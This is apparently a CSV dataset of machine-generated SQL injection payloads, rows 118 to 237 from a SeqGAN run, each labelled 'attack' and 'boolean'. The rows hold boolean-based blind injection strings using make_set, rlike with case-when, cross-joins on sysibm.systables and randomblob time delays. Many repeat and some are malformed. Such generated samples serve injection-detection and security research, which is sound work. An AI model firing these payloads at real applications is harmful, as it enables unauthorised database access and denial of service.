label,payload,family,payload_type,method,run_id,sample_index
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,118
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,119
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,120
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,121
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,122
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,123
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,124
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,125
attack,"-1422%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,126
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,127
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,128
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,129
attack,"select1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,130
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,131
attack,"-4641%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,132
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,133
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,134
attack,"-9688%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,135
attack,1'+  (  select '_jfg9687a'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,136
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,137
attack,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,138
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,139
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,140
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,141
attack,"-2925%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,142
attack,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,143
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,144
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,145
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,146
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,147
attack,"-6846%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,148
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,149
attack,"-6846%2925%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,150
attack,",s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,151
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,152
attack,"g4889%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,153
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,154
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,155
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,156
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,157
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,158
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,159
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,160
attack,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,161
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,162
attack,"-2925%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,163
attack,"-6846%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,164
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,165
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ''+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,166
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,167
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,168
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,169
attack,"-2925%=4889%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,170
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,171
attack,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,172
attack,"-6846%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,173
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,174
attack,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,175
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,176
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,177
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,178
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,179
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,180
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,181
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,182
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,183
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,184
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,185
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,186
attack,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,187
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,188
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   """"  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,189
attack,"%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,190
attack,"-9688%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,191
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,192
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,193
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,194
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,195
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,196
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,197
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,198
attack,"-8673""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,199
attack,"-2925%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,200
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,201
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,202
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,203
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,204
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,205
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,206
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""f",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,207
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,208
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,209
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,210
attack,"-6846%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,211
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,212
attack,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,213
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,214
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,215
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,216
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,217
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,218
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,219
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,220
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,221
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,222
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,223
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,224
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,225
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,226
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,227
attack,"1%"" or make_set  (  9354  =  9354,7185  )   and ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,228
attack,"""   )    )    or    (    (   """"   )    )     =     (    (   """"   )    )     =     (    (   ""x",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,229
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,230
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,231
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,232
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,233
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,234
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,235
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,236
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,237
